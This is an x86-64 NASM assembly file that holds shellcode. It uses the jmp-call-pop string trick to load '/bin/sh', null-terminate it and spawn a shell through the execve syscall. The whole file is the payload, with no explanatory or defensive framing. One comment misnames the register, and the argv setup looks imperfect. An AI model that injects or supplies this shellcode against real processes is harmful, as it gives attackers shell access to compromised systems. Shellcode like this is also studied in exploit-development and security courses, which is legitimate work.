BITS 64


; do the 'string trick'
jmp short string

code:
xor		rax,rax
pop		rdi		; pop the addr of the string intro esi (stack pointer register)
mov byte	[rdi + 7], al	; null-terminate the string
push		rdi
mov		rsi,rsp
push		rax
mov		rdx,rsp
mov byte	al,59		; execv
syscall

string:
call code
db '/bin/sh' , 0xFF
